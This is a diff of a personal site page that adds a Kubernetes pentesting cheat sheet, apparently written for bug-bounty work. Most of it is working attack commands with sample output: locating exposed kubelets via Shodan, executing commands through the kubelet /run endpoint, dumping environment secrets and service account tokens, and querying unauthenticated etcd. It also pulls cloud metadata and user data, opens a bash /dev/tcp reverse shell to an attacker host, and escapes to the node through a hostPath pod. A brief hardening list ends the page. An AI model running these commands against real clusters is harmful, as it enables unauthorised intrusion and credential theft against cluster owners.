@@ -4,27 +4,207 @@ layout: default
 permalink: /kubernetes/
 ---
 
-<div class="home">
+<div class="wrapper">
   <div class="page-heading">
-    <h2 class="page-title">Kuberenetes</h2>
+    <h1 class="page-title">kubernetes</h1>
+    <p class="page-intro">Pentesting exposed Kubernetes clusters — kubelet exploitation, metadata service abuse and privilege escalation.</p>
   </div>
-  <div class="about">
-    <div class="container-face">
-      <img class="face" src="{{site.baseurl}}/assets/img/{% if site.pic %}{{ site.pic }}{% else %}github.jpg{% endif %}" alt="">
-    </div>
-    <h2 class="tagline">{% if site.tagline %}{{site.tagline}}{% else %}{% endif %}</h2>
-    <div class="about-description">
-      <p>During some of the bug bountys I have found some good things like unprotected kuberenetes clusters.</p>
-    </div>
-    <div class="contact-contaiver">
-      <ul class="contact-list">
-        <script src="https://gist.github.com/random-robbie/7ceab7acfb02f98f52adb4305f2b436f.js"></script><br><br>
-        <script src="https://gist.github.com/random-robbie/c43e1aea1292cabd0dd26bb4f709cc8d.js"></script><br><br>
-        <script src="https://gist.github.com/random-robbie/83f926d7c6d2d72cb11ead2ea77766b7.js"></script><br><br>
-        <script src="https://gist.github.com/random-robbie/15264ee9c3dca106f01985c54c682313.js"></script><br><br>
-        <script src="https://gist.github.com/random-robbie/60ca8ec9b511c257ecd661b89d8351b2.js"></script><br><br>
-        <script src="https://gist.github.com/random-robbie/34b582a375709751488753e6c99106c4.js"></script><br><br>
-          </ul>
-    </div>
+
+  <div class="post-content" style="max-width: 860px;">
+
+    <h2>$ Finding exposed clusters</h2>
+    <p>During some of the bug bounties I have found some good things like unprotected Kubernetes clusters. The kubelet API usually listens on 10250 (authenticated) and 10255 (read-only). Shodan and Censys are full of nodes exposing these ports.</p>
+    <pre><code># Find kubelet endpoints via Shodan
+shodan search 'product:"Kubernetes" port:10250'
+
+# Check for anonymous read-only access on the kubelet port
+curl -sk https://IP:10250/pods | head -50
+curl -sk http://IP:10255/pods | head -50
+
+# Check for anonymous access to the main API server
+curl -sk https://IP:6443/api/v1/namespaces</code></pre>
+
+    <h2>$ Grabbing namespace, pod and container names from the Kubernetes API</h2>
+    <pre><code>curl -sk https://IP:10250/pods</code></pre>
+    <pre><code>{
+      "metadata": {
+        "name": "spinnaker-k8spray-clouddriver-566c56787c-l6mnj",
+        "namespace": "k8spray",
+        "uid": "e36e6e6e-8974-11e8-9663-02ceba770664",
+        "creationTimestamp": null
+      },
+      "spec": {
+        "containers": [
+          {
+            "name": "clouddriver",
+            "image": "quay.io/spinnaker/clouddriver@sha256:60a9b2f79207a8f70db93db981546350d6fd412e0e1f03640cc2f4bec35fc23c",
+            "resources": {}
+          }
+        ]
+      }
+  }</code></pre>
+    <p>So in this example the namespace is <strong>k8spray</strong>, the pod name is <strong>spinnaker-k8spray-clouddriver-566c56787c-l6mnj</strong> and the container is <strong>clouddriver</strong>.</p>
+
+    <h2>$ How to print environment values</h2>
+    <p>Environment variables frequently leak internal secrets — etcd endpoints, service account tokens, database credentials.</p>
+    <pre><code>curl -sk https://IP:10250/run/NAMESPACE/POD/CONTAINERNAME -d "cmd=printenv"</code></pre>
+    <pre><code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=ip-192-168-1-100
+ETCD_LISTEN_PEER_URLS=http://0.0.0.0:2381
+ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:4002
+ETCD_ADVERTISE_CLIENT_URLS=http://etcd-events-a.internal.k8s.io:4002
+ETCD_INITIAL_ADVERTISE_PEER_URLS=http://etcd-events-a.internal.k8s:2381
+ETCD_INITIAL_CLUSTER=etcd-events-a=http://etcd-events-a.internal.k8s:2381,etcd-events-b=http://etcd-events-b.internal.k8s:2381,etcd-events-c=http://etcd-events-c.internal.k8s:2381
+ETCD_NAME=etcd-events-a
+ETCD_DATA_DIR=/var/etcd/data-events
+ETCD_INITIAL_CLUSTER_STATE=new
+ETCD_INITIAL_CLUSTER_TOKEN=etcd-cluster-token-etcd-events
+HOME=/root</code></pre>
+
+    <h2>$ Service account token location and abuse</h2>
+    <p>Every pod gets a service account token mounted at a fixed path. If you have command execution inside a container, read it and use it against the API server to see what you are authorised to do.</p>
+    <pre><code># Read the mounted service account token and CA cert
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# Use the token against the API server
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -sk https://IP:6443/api/v1/namespaces/$NAMESPACE/pods -H "Authorization: Bearer $TOKEN"
+
+# Or with kubectl if available
+kubectl --token=$TOKEN --insecure-skip-tls-verify get pods -A</code></pre>
+
+    <h2>$ Checking permissions with kubectl auth can-i</h2>
+    <pre><code># What can this service account do globally?
+kubectl auth can-i --list -A
+kubectl auth can-i create pods -A
+kubectl auth can-i exec pods -A
+kubectl auth can-i get secrets -A
+kubectl auth can-i '*' '*' -A</code></pre>
+
+    <h2>$ etcd exposure</h2>
+    <p>etcd holds the entire cluster state, including secrets. Older clusters ran etcd on port 2379 with no authentication.</p>
+    <pre><code># Check for unauthenticated etcd access
+curl -s http://IP:2379/version
+curl -s http://IP:2379/v2/keys/?recursive=true | head -50
+
+# With etcdctl if you can reach it
+etcdctl --endpoints=http://IP:2379 ls /
+etcdctl --endpoints=http://IP:2379 get /registry/secrets --prefix --keys-only</code></pre>
+
+    <h2>$ How to connect to the AWS metadata endpoint</h2>
+    <pre><code>curl -sk https://IP:10250/run/NAMESPACE/POD/CONTAINERNAME -d "cmd=busybox wget -q -O - http://169.254.169.254/latest/meta-data/"</code></pre>
+    <pre><code>ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/
+hostname
+iam/
+instance-action
+instance-id
+instance-type
+local-hostname
+local-ipv4
+mac
+metrics/
+network/
+placement/
+profile
+public-hostname
+public-ipv4
+public-keys/
+reservation-id
+security-groups</code></pre>
+
+    <h2>$ How to grab user data on a deployment</h2>
+    <p>Instance user-data often contains bootstrap scripts with credentials, API keys and tokens in plain text.</p>
+    <pre><code>curl -sk https://IP:10250/run/NAMESPACE/POD/CONTAINERNAME -d "cmd=busybox wget -q -O - http://169.254.169.254/latest/user-data"</code></pre>
+    <pre><code>#! /bin/bash
+  echo ECS_CLUSTER=web-cluster &gt;&gt; /etc/ecs/ecs.config
+  sudo docker run -d \
+    --name instana-agent \
+    --volume /var/run/docker.sock:/var/run/docker.sock \
+    --volume /dev:/dev \
+    --volume /sys:/sys \
+    --volume /var/log:/var/log \
+    --privileged \
+    --net=host \
+    --pid=host \
+    --ipc=host \
+    --env INSTANA_PORT=443 \
+    --env INSTANA_HOST=saas-eu-west-1.something \
+    --env INSTANA_KEY=nIadsasd \
+    --env INSTANA_TAGS=fridayr \
+    instana/agent
+  /usr/verticles #</code></pre>
+
+    <h2>$ How to get a reverse shell</h2>
+    <p>Set up a listener on your VPS to connect back to:</p>
+    <pre><code>nc -lvp 4444</code></pre>
+    <pre><code>curl -sk https://IP:10250/run/NAMESPACE/POD/CONTAINERNAME -d "cmd=bash -i &gt;&amp; /dev/tcp/YOURIP/YOURPORT 0&gt;&amp;1"</code></pre>
+    <p>Once this command has been run you should have a reverse shell connected to your listener.</p>
+
+    <h2>$ How to connect to the DigitalOcean metadata endpoint</h2>
+    <pre><code>curl -sk https://IP:10250/run/NAMESPACE/POD/CONTAINERNAME -d "cmd=busybox wget -q -O - http://169.254.169.254/metadata/v1/"</code></pre>
+    <pre><code>id
+hostname
+user-data
+vendor-data
+public-keys
+region
+interfaces/
+dns/</code></pre>
+
+    <h2>$ Retrieve public SSH keys from Google metadata</h2>
+    <pre><code>curl -sk https://IP:10250/run/NAMESPACE/POD/CONTAINERNAME -d "cmd=busybox wget -q -O - --header='Metadata-Flavor: Google' http://metadata/computeMetadata/v1/project/attributes/ssh-keys?alt=json"</code></pre>
+    <p>The response will provide you with the SSH public keys used for that project.</p>
+
+    <h2>$ Kubelet ports 10250 and 10255</h2>
+    <p>Port 10250 is the full kubelet API (exec, run, logs, port-forward); 10255 is the read-only endpoint exposing pod listings and stats without authentication. Always check both, plus the metrics port.</p>
+    <pre><code># Read-only endpoint: full pod inventory with node info
+curl -s http://IP:10255/pods
+
+# Streaming container logs without auth
+curl -sk https://IP:10250/containerLogs/NAMESPACE/POD/CONTAINERNAME
+
+# Check the kubelet metrics endpoint
+curl -sk https://IP:10250/metrics | grep -i exec</code></pre>
+
+    <h2>$ hostPath mount escape</h2>
+    <p>If you can create pods (kubectl auth can-i create pods), mount the node's root filesystem via hostPath and read everything on the host — including etcd data, kubelet config, SSH keys and other pods' secrets.</p>
+    <pre><code>cat &lt;&lt;'EOF' &gt; escape.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostpath-escape
+spec:
+  containers:
+  - name: escape
+    image: busybox
+    command: ["sleep", "3600"]
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+EOF
+
+kubectl apply -f escape.yaml
+kubectl exec -it hostpath-escape -- ls /host
+# Grab the etcd client certs and node SSH keys
+kubectl exec -it hostpath-escape -- cat /host/etc/kubernetes/pki/etcd/ca.crt</code></pre>
+
+    <h2>$ Hardening notes</h2>
+    <pre><code># Good defences to recommend in a report:
+# - kubelet: --anonymous-auth=false, --authorization-mode=Webhook
+# - Close port 10255 entirely; restrict 10250 to the control plane
+# - Block pod access to 169.254.169.254 (IMDSv2 hop limit, NetworkPolicy)
+# - etcd: mutual TLS and firewall off 2379 from the node network
+# - RBAC: least privilege per service account, audit with kubectl auth can-i --list
+# - Restrict hostPath volumes with PodSecurityPolicy / admission controllers</code></pre>
+
   </div>
 </div>
